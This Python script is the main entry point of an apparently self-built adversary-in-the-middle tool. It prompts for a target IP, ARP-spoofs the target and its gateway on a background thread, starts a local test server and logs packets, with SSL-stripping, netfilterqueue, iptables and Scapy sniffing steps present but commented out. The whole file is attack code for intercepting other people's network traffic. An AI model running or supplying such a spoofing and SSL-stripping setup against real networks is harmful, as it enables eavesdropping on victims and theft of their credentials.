import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from bettercap import run_bettercap
import threading
import time

from networking import *
from arpspoof import *
from server import *
from export import Packet_Handler
from modules import *

def main():
    # If necessary, enable/disable ip_forwarding
    # set_ip_forwarding(True)

    # Enable queueing rule in iptables
    # queue_iptables_rule(True)

    # Start a Server for testing purposes
    server = Server()
    server_thread = threading.Thread(target=server.start, args=(8000,))
    server_thread.daemon = True
    server_thread.start()

    # server_2 = Server()
    # server_thread_2 = threading.Thread(target=server_2.start, args=(443,))
    # server_thread_2.daemon = True
    # server_thread_2.start()

    # Wait for the server to start
    while not server.is_ready():
        time.sleep(0.1)

    # Create a packet handler
    pkt_handler = Packet_Handler('pkt_log.txt')
    
     # Arp spoofing setup
    arp_spoofer = ArpSpoofer()
    target_ip = input("Target IP: ")
    gateway_ip = get_default_gateway_ip()

    # Packet queueing setup (on packet forward, run method)
    # nfqueue = NetfilterQueue()
    # nfqueue.bind(1, lambda x: ssl_strip(x, pkt_handler))
    # nfqueue.bind(1, lambda x: ssl_strip(x, target_ip, pkt_handler))

    # Start nfqueue and run it on a separate thread
    # nfqueue_thread = threading.Thread(target=nfqueue.run)
    # nfqueue_thread.daemon = True
    # nfqueue_thread.start()

    # nfqueue_thread = threading.Thread(target=nfqueue.run)
    # nfqueue_thread.daemon = True
    # nfqueue_thread.start()


    # Begin capturing and processing/analyzing packets
    # target_filter = "tcp port 80 or tcp port 443"
    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter=target_filter)
    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter="tcp")
    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip)
    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=lambda x: ssl_strip(x), filter="tcp")
    
    # capture_device = scapy.AsyncSniffer(iface="eth0", filter=target_filter)
    # capture_device.start()

    try:
        # Begin Spoofing on separate thread
        spoof_thread = threading.Thread(target=arp_spoofer.spoof, args=(gateway_ip, target_ip))
        spoof_thread.daemon = True
        spoof_thread.start()

        # Continue main thread...
        print("Continue...")

        # Rejoin all threads to main thread
        server_thread.join()
        # server_thread_2.join()
        #nfqueue_thread.join()
        # server_thread_2.join()
        # nfqueue_thread.join()
        spoof_thread.join()

    except KeyboardInterrupt:
        # Restore ARP tables and remove the AITM position
        arp_spoofer.cleanup(gateway_ip, target_ip)

        # Unbind netfilterqueue and restore iptables
        #nfqueue.unbind()
        # queue_iptables_rule(False)

        # End packet capturing
        # capture = capture_device.stop()
        # writeCapture(capture)

        # Stop Server
        server.stop()
        # server_2.stop()
        
        # Disable IP_Forwarding (Default)
        # set_ip_forwarding(False)

        # Write handled packets to a file
        pkt_handler.write_to_file()

if __name__ == "__main__":
    main()

